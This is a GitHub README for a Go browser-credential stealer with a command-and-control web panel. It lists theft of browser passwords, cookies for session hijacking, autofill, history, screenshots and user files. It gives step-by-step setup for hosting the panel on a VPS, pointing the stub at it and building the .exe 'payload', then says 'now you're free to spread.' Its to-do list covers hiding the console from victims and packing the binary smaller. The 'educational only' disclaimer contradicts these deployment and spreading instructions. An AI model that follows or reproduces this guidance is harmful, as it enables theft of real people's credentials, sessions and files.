# ZTrace-Web-Stealer
ZTrace Made In Golang. Web Panel.

![1](https://github.com/user-attachments/assets/c8340adc-bf0a-4806-8f91-c70f8e0ed27b)
![2](https://github.com/user-attachments/assets/2337e6c3-6b79-4ec8-a230-bf1f7b4c62c5)


# 🕳️ ZTrace Panel

![License](https://img.shields.io/badge/license-ECL-blueviolet)
![Status](https://img.shields.io/badge/status-Educational%20Only-red)
![Platform](https://img.shields.io/badge/platform-Windows%2010%2B-blue)
![Language](https://img.shields.io/badge/language-golang-brightgreen)
![Stealth](https://img.shields.io/badge/stealth-mode-lightgrey)

> **ZTrace Panel** is a powerful, stealthy data extraction simulation tool written in **GOLANG** for **educational and research purposes only**. It mimics the behavior of real-world malware used by threat actors, allowing cybersecurity students, researchers, and blue teams to explore how these attacks work — and how to defend against them.



- 🔐 **Password recovery** from Chromium-based browsers 
- 🍪 **Cookie** extraction & session hijack simulation  V20  [ updated ]
- 📑 Collects **bookmarks**, **autofill data**, and **browser history** [ updated ]
- 📸 **Screenshot** capture of the active desktop
- 📂 Steals **files** from `Desktop`, `Documents`, `Downloads`



## 🧪 Intended Use

This project is built as a **cybersecurity lab tool** for:

- 🧬 Malware analysis practice
- 🧑‍💻 Ethical hacking labs
- 🛡️ Blue team defense testing
- 🔐 Detection engineering (YARA/Sigma rules, etc.)
- 🧠 Understanding how modern stealers operate

Run in **virtualized environments only.**

---

## ⚠️ Disclaimer

> This software is provided **exclusively for educational and ethical research purposes.**
>
> - ❌ Do **NOT** use it on real targets or personal machines.
> - ❌ Do **NOT** deploy or distribute this code with malicious intent.
> - ✅ Use only in isolated VMs or malware sandboxes.
>
> The author takes **no responsibility** for misuse or damages. By using this software, you agree to use it **legally and ethically**, in full compliance with local and international laws.

---

## 🛠️ Build & Run

how can i run the panel?

you need linux or windows VPS to host the panel.

you must have golang installed on your Linux or Windows VPS,  1.24

after that go to  gopanel folder, if you wanna change your port  edit  mypanel.go open it with notepad++ or visual studio code, and go all the way down below
you will find port 8080 <=  you can change it from here port for your panel.  [ note : your port should be same on the stub too so let's get into that too ]


after that go to  stub folder,  if you wanna change your port to make it same with the panel one, open main.go with notepad++ or with visual studio code
find the func  continuewithme() <=  and a bit below you will see  IP and Port,  you must change  the IP to your  VPS IP  Linux/Windows,  and the port same with panel.


or you can keep all same, just change IP from the stub  from the main.go  continuewithme() func



then to run panel just do,  go run mypanel.go   and it will start.

then go back to  stub folder and  open build.txt you will see here command line code  copy it.  

open cmd  and cd into stub folder  order to use this command line code to build our  stub.

paste it and press enter,  it can take few min if you installed golang new.   and you will see .exe comes as output, that's your payload.


now you're free to spread.


What Needs To Be Fixed On That Project??

1. All Works Fine, It's Stable , BUT when you run the payload it extracts all in Results folder and it zips it with random zip name and sends to panel [ victim can see that ]
2. Consoles should be fully hidden better.
3. FUPX Should be used to decrease size from 20 mb to 4-5 MB.


I Won't fix those issues above,  fix them yourself,  respect my time.
